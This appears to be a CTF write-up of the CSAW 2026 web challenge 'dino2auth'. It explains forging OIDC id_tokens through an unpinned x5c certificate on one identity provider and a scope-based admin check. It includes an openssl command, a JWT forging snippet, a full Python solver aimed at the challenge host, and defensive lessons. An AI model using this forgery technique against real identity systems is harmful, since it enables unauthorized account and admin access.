---
title: "CSAW 2026 — dino2auth: Forging OIDC Tokens"
date: "2026-09-20"
tags: ["csaw-2026", "web", "oidc", "jwt"]
excerpt: "Two first-party identity providers, one of which forgot to pin its signing certificate. An error oracle in the callback exposed the gap, and the admin gate keyed off scope rather than sub."
---

> **CSAW CTF 2026 · Web**
> **Flag:** `csaw{str4ta_sk1pped_th3_p1n}`

A dinosaur-themed poster shop with a login button, two identity providers, and one
panel I wasn't allowed to see. The bug wasn't in the crypto — the crypto was fine.
It was that one of the two login paths simply forgot to run the check the other one ran.

## The target

`TrustDinOIDC` is a small marketplace. Two posters are on offer: the *Freeosaurus*
print for members, and the *Flagosaurus* print for admins. Guess which one holds the flag.

Login goes through one of two first-party identity providers — `/idp/paleoid` and
`/idp/strataid`. Both live on the same host as the relying party, so this is a
self-contained OIDC setup with no third parties to lean on.

The first thing worth checking in any OIDC challenge is what the token actually
looks like. Here, the authorize endpoint hands back a signed `id_token` whose
header carries an `x5c` claim:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": ["MIICyDCCAbCgAwIBAgIUUtdg5TXRUXkSx3jSXqe..."]
}
```

`x5c` is an embedded X.509 certificate chain — the token carries *the certificate
used to verify it*. That's the whole game: if the server trusts the certificate the
attacker supplies, the attacker can sign their own tokens.

Two more facts made this promising:

- Both IdP certificates are **self-signed**, with `CN` equal to the issuer hostname.
- **The session cookie *is* the raw `id_token`.** The app re-validates it on every
  request, so forging a token isn't one step of authentication — it *is*
  authentication.

## Everything that didn't work

I'll spare you the suspense: the obvious `x5c` attack is properly defended. I spent
a while confirming that, and the list is worth recording because each of these is a
real bug class that simply isn't present here:

- **Self-signed cert with the right CN** → `certificate mismatch`
- **Chain confusion** — `[fake, real]`, `[real, fake]`, `[fake, real, real]`, hoping
  the server would validate trust against one element and the signature against another
- **Algorithm confusion** RS256→HS256, HMAC-ing with the public key in every encoding
  I could think of (PEM, DER, cert PEM, cert DER, the raw base64 from `x5c`)
- **`alg: none`**, plus the `None`/`NONE` casing variants
- **Scope injection at the IdP** — the authorize endpoint silently strips anything
  outside its allowlist
- **The `state` action namespace** — `state` is formatted `<action>:<random>`, so I
  tried `flagosaurus:`, `admin:`, and friends
- **Controlling `sub`** via `login_hint`, `user`, `role`, `tier`, and ~15 others.
  Nothing but `exp` ever changed.

Signature validation was solid. Which meant the bug was somewhere other than the
signature.

## The lever: an error oracle

The thing that cracked this open wasn't a payload, it was a *diagnostic*.

`POST /oauth/callback` echoes its validation exception verbatim:

```
missing x5c
certificate mismatch
unknown issuer
Signature verification failed
list index out of range
error parsing asn1 value: ParseError { ... }
```

That's a map of the validation pipeline. Each distinct message tells you exactly how
far your token got before it was rejected. Instead of guessing payloads blind, I
could now send deliberately malformed tokens and watch *which* check tripped.

So I walked a forged token through the pipeline under each issuer in turn.

## Bug 1 — the pin that only one issuer enforces

Here is the entire vulnerability, in two requests that differ by one claim:

| `iss` claim | response to a forged, self-signed cert |
|---|---|
| `paleoid.example.com`  | `401 certificate mismatch` |
| `strataid.example.com` | **`200 OK`** |

The `paleoid` path compares the certificate in `x5c` against a pinned copy. The
`strataid` path never does. Same application, same token structure, same forged
certificate — one issuer checks, the other shrugs.

That's arbitrary token forgery. Generate a key, sign whatever claims you like, set
`iss` to `strataid.example.com`, and the relying party accepts it.

```bash
openssl req -x509 -newkey rsa:2048 -keyout fake.key -out fake.crt \
        -days 365 -nodes -subj "/CN=anything"
```

Note the `CN` is literally `anything`. It doesn't matter, because nothing checks it.

## Bug 2 — admin isn't who you are, it's what you asked for

Forgery in hand, I set `sub: admin` and… still wasn't an admin.

So I fuzzed the claim space: `role`, `tier`, `groups`, `is_admin`, `acr`, `amr`,
`tenant`, `level`, `entitlements`. Every one of them changed nothing. The identity
claims are decorative.

The actual gate is **`scope`**:

```
scope: "openid profile freeosaurus:redeem flagosaurus:redeem"
```

`flagosaurus:redeem` is the admin check. And here's the neat part — the IdP *refuses
to mint that scope*. Request it at the authorize endpoint and it's silently stripped
by an allowlist. The restriction lives entirely in the issuer.

Which stops mattering the moment you're the issuer.

## The exploit

```python
import jwt, base64, time

fake_key = open("fake.key").read()
fake_der = open("fake.crt.der", "rb").read()

token = jwt.encode(
    {
        "iss":   "strataid.example.com",      # the unpinned issuer
        "sub":   "admin",
        "aud":   "trustdinoidc-portal",
        "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
        "exp":   int(time.time()) + 9999,
    },
    fake_key,
    algorithm="RS256",
    headers={"typ": "JWT", "x5c": [base64.b64encode(fake_der).decode()]},
)
```

Send it as the `session` cookie, load the homepage, and the Flagosaurus panel renders:

```
csaw{str4ta_sk1pped_th3_p1n}
```

The flag names the bug: *strata skipped the pin*.

## Solver

Generates a throwaway certificate, forges an admin token on the unpinned issuer, and reads the flag out of the Flagosaurus panel. It also prints the error-oracle comparison that exposes the bug — `paleoid` rejects the forged cert, `strataid` accepts it.


```python solve_dino2auth.py
#!/usr/bin/env python3
"""
dino2auth (CSAW 2026, web) — full solver.
Flag: csaw{str4ta_sk1pped_th3_p1n}

BUG 1  Certificate pinning is enforced for iss=paleoid.example.com but NOT for
       iss=strataid.example.com, so any self-signed cert in the JWT x5c header
       is accepted on the strataid path => arbitrary token forgery.
BUG 2  Admin is gated on the `scope` claim containing "flagosaurus:redeem",
       not on sub/role/tier. The IdP strips that scope from real tokens --
       irrelevant once you sign your own.

The session cookie IS the id_token, so a forged token is a full login.
"""
import base64, re, subprocess, sys, tempfile, time, os
import jwt, requests

BASE = "https://dino2auth.ctf.csaw.io"


def make_cert(tmp):
    """Self-signed cert; the CN is irrelevant because strataid never checks it."""
    key, crt = f"{tmp}/fake.key", f"{tmp}/fake.crt"
    subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key,
         "-out", crt, "-days", "365", "-nodes", "-subj", "/CN=anything"],
        check=True, capture_output=True)
    der = subprocess.run(["openssl", "x509", "-in", crt, "-outform", "DER"],
                         check=True, capture_output=True).stdout
    return open(key).read(), base64.b64encode(der).decode()


def forge(key_pem, x5c_b64, iss="strataid.example.com", sub="admin",
          scope="openid profile freeosaurus:redeem flagosaurus:redeem"):
    return jwt.encode(
        {"iss": iss, "sub": sub, "aud": "trustdinoidc-portal",
         "scope": scope, "exp": int(time.time()) + 9999},
        key_pem, algorithm="RS256",
        headers={"typ": "JWT", "x5c": [x5c_b64]})


def main():
    with tempfile.TemporaryDirectory() as tmp:
        key_pem, x5c = make_cert(tmp)

        # Optional: show the error-oracle difference that reveals the bug.
        for iss in ("paleoid.example.com", "strataid.example.com"):
            t = forge(key_pem, x5c, iss=iss)
            r = requests.post(f"{BASE}/oauth/callback",
                              data={"id_token": t, "state": ":x"}, timeout=20)
            print(f"[oracle] iss={iss:24} -> {r.status_code} {r.text.strip()[:60]}")

        token = forge(key_pem, x5c)
        r = requests.get(BASE + "/", cookies={"session": token}, timeout=20)
        flag = re.search(r"csaw\w*\{[^}]*\}", r.text)
        if flag:
            print(f"\n*** FLAG: {flag.group(0)}")
            return 0
        panel = re.search(r'id="flagosaurus".*?</div>', r.text, re.S)
        print("no flag; flagosaurus panel said:",
              re.sub(r"\s+", " ", panel.group(0)) if panel else "?")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

## What to take from it

**Per-issuer trust configuration is where multi-IdP systems rot.** The crypto here
was textbook — RS256 verified properly, no algorithm confusion, chain validation
intact. One code path just didn't call the pinning function, and that single
omission defined the security of the entire application. Your authentication is
exactly as strong as your weakest configured issuer, not your strongest.

**Verbose error messages are an attack surface in themselves.** `certificate
mismatch` versus `unknown issuer` versus `Signature verification failed` is a
free schematic of your validation order. I didn't find this bug by being clever
about certificates; I found it by diffing error strings until two issuers
disagreed.

**Separate authentication from authorization when you reason about a target.**
I lost time assuming admin would be an identity claim, because that's where admin
usually lives. Here, identity was forgeable *and* irrelevant — the privilege rode
on a scope string that the issuer was trusted to police. Once you can forge tokens,
every "the server won't issue that" control evaporates.
